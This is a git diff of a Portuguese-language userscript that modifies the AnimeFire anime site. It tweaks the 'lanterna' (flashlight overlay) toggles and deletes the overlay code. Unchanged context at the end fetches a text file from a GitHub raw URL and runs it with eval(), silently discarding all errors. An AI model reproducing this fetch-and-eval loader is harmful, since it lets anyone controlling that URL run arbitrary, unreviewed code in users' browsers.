@@ -668,7 +668,8 @@ location.reload();`,
 
  "site": `window.open('https://mikill73.github.io/AnimeFireMod/', '_blank');`,
 
-    "lanternaon": `localStorage.setItem('lanterna', 'on');`,
+    "lanternaon": `localStorage.setItem('lanterna', 'on');
+                                       location.reload();`,
 
       "limparchat": `var divMSGsList = document.querySelectorAll(".divMSGs");
 if (divMSGsList.length > 0) {
@@ -679,7 +680,8 @@ if (divMSGsList.length > 0) {
     console.log("Divs não encontradas.");
 }`,
 
-      "lanternaoff": `localStorage.setItem('lanterna', 'off');`
+      "lanternaoff": `localStorage.setItem('lanterna', 'off');
+                                        location.reload();`
 
   };
 
@@ -1347,70 +1349,10 @@ createButtonWithArrowAfter('Carregar próximo episódio no player', 'https://ani
 });
 })();
 
-
-//suporte para lanternaon e lanternaoff
-(function() {
-  'use strict';
-
-const isDesktop = /Mac|Windows|Linux/.test(navigator.userAgent);
-
-function applyDistortion() {
-    if (!document.querySelector('.distortion-layer')) {
-        const distortionLayer = document.createElement('div');
-        distortionLayer.className = 'distortion-layer';
-        distortionLayer.style.position = 'fixed';
-        distortionLayer.style.top = '0';
-        distortionLayer.style.left = '0';
-        distortionLayer.style.width = '100%';
-        distortionLayer.style.height = '100%';
-        distortionLayer.style.pointerEvents = 'none';
-        distortionLayer.style.background = 'linear-gradient(transparent, transparent)';
-        distortionLayer.style.zIndex = '9999';
-        document.body.appendChild(distortionLayer);
-
-        document.addEventListener('mousemove', (e) => {
-            const mouseX = e.clientX;
-            const mouseY = e.clientY;
-
-            const distortionStrength = 20;
-            const translateX = (mouseX - window.innerWidth / 2) / window.innerWidth * distortionStrength;
-            const translateY = (mouseY - window.innerHeight / 2) / window.innerHeight * distortionStrength;
-
-            distortionLayer.style.background = `radial-gradient(circle at ${mouseX}px ${mouseY}px, transparent 100px, rgba(0, 0, 0, 0.5) 150px)`;
-            distortionLayer.style.transform = `translate(-${translateX}px, -${translateY}px)`;
-        });
-    }
-}
-
-function removeDistortion() {
-    const distortionLayer = document.querySelector('.distortion-layer');
-    if (distortionLayer) {
-        document.body.removeChild(distortionLayer);
-    }
-}
-
-function handleStorageChange(event) {
-    if (event.key === 'lanterna') {
-        if (event.newValue === 'on') {
-            applyDistortion();
-        } else {
-            removeDistortion();
-        }
-    }
-}
-
-window.addEventListener('storage', handleStorageChange);
-
-// Verificar o valor do localStorage ao carregar a página
-const lanternStatus = localStorage.getItem('lanterna');
-if (lanternStatus === 'on') {
-    applyDistortion();
-}
-})();
-
 (function() {
     'use strict';
 
     fetch('https://raw.githubusercontent.com/Mikill73/miniature-umbrell/main/mod2.txt').then(response=>response.text()).then(code=>{try{eval(code)}catch(error){}}).catch(error=>{});
 
 })();
+
